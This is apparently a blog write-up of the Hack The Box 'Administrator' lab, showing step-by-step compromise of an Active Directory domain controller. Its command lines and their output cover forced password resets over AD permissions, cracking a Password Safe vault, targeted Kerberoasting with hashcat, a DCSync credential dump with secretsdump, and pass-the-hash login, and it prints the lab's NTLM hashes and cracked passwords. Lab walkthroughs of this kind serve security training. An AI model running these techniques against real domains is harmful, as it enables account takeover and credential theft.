---
title: "Administrator"
slug: administrator
date: 2025-06-26
tags: ["Windows", "AD", "DCSync", "hashcat", "targetedkerberoarsting", "evil-winrm"]
draft: false
---
![[Administrator.png]]


# Summary
1. using `netexec` to find we have PSRemote permissions on the box
2. run bloodhound via evil-winrm
3. abuse `GenericAll` permissions on Michael
4. abuse `ForceChangePassword` on Benjamin
5. Find pwsafe vault in FTP
6. crack the vault and find Emily's password
7. Abuse Targeted Kerberoasting to get Ethan's hash
8. Crack the hash of Ethan
9. perform the DCSync Attack

---
# USER
## Initial Enumeration

This machine is a bit different from other HTB Machines. we receive some info at the beginning and start the box with a username and password. `olivia` / `ichliebedich` are the valid credentials we start with.
This looks like an Assume Breach Scenario. cool!

As usual, I will perform a simple full port scan followed by a more detailed targetted port scan to find running services.

full port scan
```bash
nmap -p- -vvvv administrator

PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
55057/tcp open  unknown          syn-ack ttl 127
55062/tcp open  unknown          syn-ack ttl 127
55073/tcp open  unknown          syn-ack ttl 127
55084/tcp open  unknown          syn-ack ttl 127
64413/tcp open  unknown          syn-ack ttl 127
```

detailed targetted port scan
```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-03 22:36:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-01-03T22:36:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

This windows machine looks like a Domain Controller, why? 
I will not do the whole explanation as I did it for other boxes already but:
DNS (53), Kerberos (88,464) LDAP (389, 636, 3268, 3269) and rpc/smb (135,139,445).
also one interesting service: FTP, we don't see that a lot.

---
## Remote Powershelling

Using the credentials with `netexec` I can see this user has access to the target box already.
```bash
netexec winrm administrator -u 'olivia' -p 'ichliebedich'
WINRM       10.129.97.203   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.97.203   5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```

I can use Evil-winRM to get access.
```bash
evil-winrm -i administrator -u 'olivia' -p 'ichliebedich'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> 
```

## AD Enumeration

```

*Evil-WinRM* PS C:\Users\olivia\Documents> whoami
administrator\olivia
*Evil-WinRM* PS C:\Users\olivia\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\olivia\Documents>  Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=administrator,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=administrator,DC=htb
DistinguishedName                  : DC=administrator,DC=htb
DNSRoot                            : administrator.htb
DomainControllersContainer         : OU=Domain Controllers,DC=administrator,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1088858960-373806567-254189436
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=administrator,DC=htb
Forest                             : administrator.htb
InfrastructureMaster               : dc.administrator.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=administrator,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=administrator,DC=htb
ManagedBy                          :
Name                               : administrator
NetBIOSName                        : ADMINISTRATOR
ObjectClass                        : domainDNS
ObjectGUID                         : 79b47a22-3743-4ad3-9e13-13b6432ae1bb
ParentDomain                       :
PDCEmulator                        : dc.administrator.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=administrator,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.administrator.htb}
RIDMaster                          : dc.administrator.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=administrator,DC=htb, DC=DomainDnsZones,DC=administrator,DC=htb, CN=Configuration,DC=administrator,DC=htb}
SystemsContainer                   : CN=System,DC=administrator,DC=htb
UsersContainer                     : CN=Users,DC=administrator,DC=htb


```

so I'm adding `dc.administrator.htb` to my hosts file and continuing search.

my next step is to run bloodhound.

### Bloodhound
I have set up bloodhound in my own network using this guide: 
https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose

with the following command I have gathered data about the target domain.
```powershell
.\Sharphound.exe --CollectionMethods All
```

once Ingested into Bloodhound I can do some graph analysis.
I start by looking into the `olivia`
![[Pasted image 20250103172623.png]]

in Pathfinding I can see the following:
![[Pasted image 20250103172908.png]]

But since this session is not administrator session I cannot dump the credentials of the DC to Perform a DCSync attack.
let's look for something else

Apparently, Olivia has `GenericAll` Over the Michael user in this domain.
![[Pasted image 20250103173116.png]]

This means I can change Michaels' password and become Michael

#### Lateral Movement Olivia to Michael
I can do this from within my evil-winrm session
```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael newpassword123 /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\olivia\Documents>
```

and since Michael has PSRemote Privileges on the box, I can now evil-winrm using Michaels' account
```bash
evil-winrm -i administrator -u michael -p newpassword123
  
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> whoami
administrator\michael
*Evil-WinRM* PS C:\Users\michael\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\michael\Documents> 
```

What can Michael do? 

I'll check bloodhound again.
by looking at the 'OutBound Object Control' I see the following
![[Pasted image 20250103173357.png]]
#### Lateral Movement Michael to Benjamin
So yet another password I can change. let's go
```
*Evil-WinRM* PS C:\Users\michael\Documents> net user benjamin newpassword123
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Access is denied.*Evil-WinRM* PS C:\Users\michael\Documents>
```

So Apparently I cannot do this from within a PSSession.
let's try and use `rpcclient`

```bash
rpcclient administrator -U 'michael%newpassword123'
rpcclient $> setuserinfo2 benjamin 23 newpassword123
rpcclient $> exit
```

and this worked, as I can tell via netexec
```
netexec smb administrator -u benjamin -p newpassword123
SMB         10.129.97.203   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.97.203   445    DC               [+] administrator.htb\benjamin:newpassword123
```

unfortunately, Benjamin does not have PSRemote Privileges so Evil-WinRM won't work.
According to bloodhound, this Benjamin user is quite useless. so let's look at something that has nothing to do with Active Directory. FTP!

## FTP

I connect to FTP using the built in cli tool
And I can see a file called `Backup.psafe3`.
```bash
ftp benjamin@administrator
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||57459|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||57460|)
150 Opening ASCII mode data connection.
100% |******************************************************************************|   952       95.96 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (93.60 KiB/s)
ftp>
```

I downloaded the file and try to open it.
it looks like a password manager file for this software https://pwsafe.org/

I download this on my own machine and transfer the file.
upon opening I need to enter a master password.

## cracking pwsafe file

Using pwsafe2john I extract the hash of this file. 

```bash
pwsafe2john Backup.psafe3 > pwsafe.hash

cat pwsafe.hash 
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050

```

now using john I will try to crack the masterpassword
```
john pwsafe.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=pwsafe
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-01-03 11:02) 3.225g/s 26425p/s 26425c/s 26425C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

`tekieromucho` is the password
![[Pasted image 20250103180257.png]]

From bloodhound I can tell that Emily is the most interesting person so let's continue with her :)

`emily` / `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

logging in as `emily` using `evil-winrm` I got myself the user flag
```bash
evil-winrm -i administrator -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> type ../Desktop/user.txt
8b2bd08b496aa4b3de78281e90c2c20f
*Evil-WinRM* PS C:\Users\emily\Documents>
```

---
# ROOT

Looking at `Bloodhound` again I can see a clear path to domain admin now.
![[Pasted image 20250104143152.png]]

so Emily has GenericWrite over Ethan, and Ethan has DCSync permissions.
Easy.

let's start with part one.

## Privilege Escalation Pt.1 - Becoming Ethan
So, `GenericWrite` works a bit different as `GenericAll` or `ForceChangePassword`.
with the other 2 I had write permission over the password attribute of the other accounts, which made it easy to take control. This is not the case in `GenericWrite`. Why?
GenericWrite gives you Write Privileges over non-protected attributes of the user object and the password attribute is obviously a protected attribute. So... What can we do ?

Well, `GenericWrite` grants permission to write to the `msds-KeyCredentialLink` attribute of the target, writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using `kerberos PKINIT`.  This is called the ShadowCredential Attack.

But today I chose to execute the Targeted Kerberoasting attack. This attack will set an SPN for the target account and then retrieve the hash using kerberoasting. in the hopes that I can crack the password offline
### Targeted Kerberoasting
For this technique I sue the `targetedkerberoasting.py` script from https://github.com/ShutdownRepo/targetedKerberoast
```bash
#downloading the repo
git clone https://github.com/ShutdownRepo/targetedKerberoast.git

cd targetedKerberoast

python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
Traceback (most recent call last):
  File "/home/rival23/administrator/targetedKerberoast/targetedKerberoast.py", line 597, in main
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This failed because the time of my attacker machine is not synchronized with the time of the targetted machine. And since Kerberos is dependent on time, this will fail.
you can synchronize clocks using `ntpdate`.
```bash
sudo ntpdate administrator
2025-01-04 14:55:59.140673 (-0600) +25200.781345 +/- 0.004855 administrator 10.129.253.112 s1 no-leap
CLOCK: time stepped by 25200.781345
```

executing the attack again we get the following output
```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$1a830ad9bb97c720851c44458f00cf03$1b37c4ab9d8534dd5234c21370e9e092334739df786e66ddb286d12924f0318ecd40a12bdbb1993bd9f07da42581b2f12bc9d67bba4d880ac82401be391d792c77fde46deb928faaab5c6bd77ae5f8105b2bcf72245b8202ea0e5d6c3fa0861d56d212ddd519150d5275fc9835dbe374cda02b33fdb3f8404d0133343b49edd87f610645753b7a135deba8a4c58193bce45923310b147b5328239cd683bd2da9da6fadd535f80089f224197cf61cc9e0d37bbba4f468d07a3e8b58b468a966547a464f01a8c28476a61c1162a5c514d241fea084f3bab602f092d58eddc14f22c98973d7de320701cf241f813bdefe24ca5f1096ef34fe9d54ea292cf149a66c15b84644b27fb1652f6ea5daf8fed863a5e01142e2b89ad7a8db75a9c53c491effbcfaad4540fe8d5cecddb21a8c9bbe6c4cca9453c26e416b01bd1de4cdf176f68a065b484abfc3f7a19e63ea6365a04b28a8787d318d21b1d4ee0b7671c723a7fcc62d3c172541c2d85e35c7449e020795a3ae05fa1ad5d65ab2ad3c7dd8c9637a402705db482eaa6719418dc2c3674d0fb7f1cb7a4d3f3a5ed6a7a9bbe45b2f8b601ae501afd716b7be550689804fb8643e9c46c099e888288760eb9aeac346969ac51d0c4bdf953f49069db61cb83aeb93318ae19588bfec44425ed2b776c67279812d72d714f45fe434d09dcb3e89fa0c26ff51ac0df18cb72cec4507a199d45ec1c355eece1a965392cec7ad55df45e408a02e886b8846aee6204dcd8c34f2baba4935387857a55c6f9a9cff645aedba7b7b402bf2fb4d4b0b129ff648bd5b1653c6a7ee9a41e0af6e1d81a5c8782601d3f2b3acf57ad0e628e2b3b81b8ee54e5574f26a5e8d6a1f778f970ba18aa83b14fbe77b35d7d3e5b89357b2085965a6a16ea3136423f6e635b90d0f377d501fb4338e1a6535dcedecbb30f2f42646a868bd075fbbd78284160c8c775401cc2359a38e172366b981fc9818f4eb7ce28c8f555019b67dba6fd5d17218a5328bce6af4c771dc174572d9b7b53e3f27b614ecf01274455d4b7fcc3621ff64e957e579ba9364b9f224d7c9a141cf6caf4ae93f115e65dd6574daf4e08befc0d3723c44611b14900cae26d7d516ad0a4bff32f77ba8bf9487bd49f6e09c457f67a626af7ac64cad209254feede37d2937634321a9fbdb7fc482ca4e8f17869fec3392cba70f25f78e8ac41931fbc740c96e09c11d71c6ce7261ec253c07b512d41df4e52de9e42b9df9a0396bf25f0db64c6430054466132f8a399c472b3a5041dcb088487071b924954c227338d1a3d4f74e13c96d1477b0c327e200e094f66743eec90980901a1526dd962f58bcdd856b6c425e074d8c5aeac3e267d9200a2847876d97e73cc7ee080fddce7a0a11c6d617575cc45a7bd670a1cf85c6334dd4a27d512f8a0bcd54e7d51b28ed09a5a067d9e48cda8260e1706f51a7982e2ef020aec84e7093b5b31b1389f22f7d8820eb1ea833e8a620ad7761e64a4bd4394f8201d8787378b276628e93ab9d3e
[VERBOSE] SPN removed successfully for (ethan)
```

this Hash can now be cracked offline using `hashcat`.
```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt.gz
```

result:
```
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$1a830ad9bb97c720851c44458f00cf03$1b37c4ab9d8534dd5234c21370e9e092334739df786e66ddb286d12924f0318ecd40a12bdbb1993bd9f07da42581b2f12bc9d67bba4d880ac82401be391d792c77fde46deb928faaab5c6bd77ae5f8105b2bcf72245b8202ea0e5d6c3fa0861d56d212ddd519150d5275fc9835dbe374cda02b33fdb3f8404d0133343b49edd87f610645753b7a135deba8a4c58193bce45923310b147b5328239cd683bd2da9da6fadd535f80089f224197cf61cc9e0d37bbba4f468d07a3e8b58b468a966547a464f01a8c28476a61c1162a5c514d241fea084f3bab602f092d58eddc14f22c98973d7de320701cf241f813bdefe24ca5f1096ef34fe9d54ea292cf149a66c15b84644b27fb1652f6ea5daf8fed863a5e01142e2b89ad7a8db75a9c53c491effbcfaad4540fe8d5cecddb21a8c9bbe6c4cca9453c26e416b01bd1de4cdf176f68a065b484abfc3f7a19e63ea6365a04b28a8787d318d21b1d4ee0b7671c723a7fcc62d3c172541c2d85e35c7449e020795a3ae05fa1ad5d65ab2ad3c7dd8c9637a402705db482eaa6719418dc2c3674d0fb7f1cb7a4d3f3a5ed6a7a9bbe45b2f8b601ae501afd716b7be550689804fb8643e9c46c099e888288760eb9aeac346969ac51d0c4bdf953f49069db61cb83aeb93318ae19588bfec44425ed2b776c67279812d72d714f45fe434d09dcb3e89fa0c26ff51ac0df18cb72cec4507a199d45ec1c355eece1a965392cec7ad55df45e408a02e886b8846aee6204dcd8c34f2baba4935387857a55c6f9a9cff645aedba7b7b402bf2fb4d4b0b129ff648bd5b1653c6a7ee9a41e0af6e1d81a5c8782601d3f2b3acf57ad0e628e2b3b81b8ee54e5574f26a5e8d6a1f778f970ba18aa83b14fbe77b35d7d3e5b89357b2085965a6a16ea3136423f6e635b90d0f377d501fb4338e1a6535dcedecbb30f2f42646a868bd075fbbd78284160c8c775401cc2359a38e172366b981fc9818f4eb7ce28c8f555019b67dba6fd5d17218a5328bce6af4c771dc174572d9b7b53e3f27b614ecf01274455d4b7fcc3621ff64e957e579ba9364b9f224d7c9a141cf6caf4ae93f115e65dd6574daf4e08befc0d3723c44611b14900cae26d7d516ad0a4bff32f77ba8bf9487bd49f6e09c457f67a626af7ac64cad209254feede37d2937634321a9fbdb7fc482ca4e8f17869fec3392cba70f25f78e8ac41931fbc740c96e09c11d71c6ce7261ec253c07b512d41df4e52de9e42b9df9a0396bf25f0db64c6430054466132f8a399c472b3a5041dcb088487071b924954c227338d1a3d4f74e13c96d1477b0c327e200e094f66743eec90980901a1526dd962f58bcdd856b6c425e074d8c5aeac3e267d9200a2847876d97e73cc7ee080fddce7a0a11c6d617575cc45a7bd670a1cf85c6334dd4a27d512f8a0bcd54e7d51b28ed09a5a067d9e48cda8260e1706f51a7982e2ef020aec84e7093b5b31b1389f22f7d8820eb1ea833e8a620ad7761e64a4bd4394f8201d8787378b276628e93ab9d3e:limpbizkit
```

new set of valid credentials: 
`ethan` / `limpbizkit`

## Privilege Escalation Pt.2 - DCSync Attack
I already know Ethan's account has DCSync attack permissions so let's get to the point.

To perform a DCSync Attack from a linux machine we can use the Secretsdump tool from the Impacket suite.

```bash
impacket-secretsdump 'Administrator.htb'/Ethan:limpbizkit@administrator
```

The Output looks like the following
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
```

Now we can use the administrator's hash to get a remote shell via `winrm` onto the domain controller
```bash
evil-winrm -i administrator -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
c9f9f3e9a12026a625b9a32637d96848
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Done
---
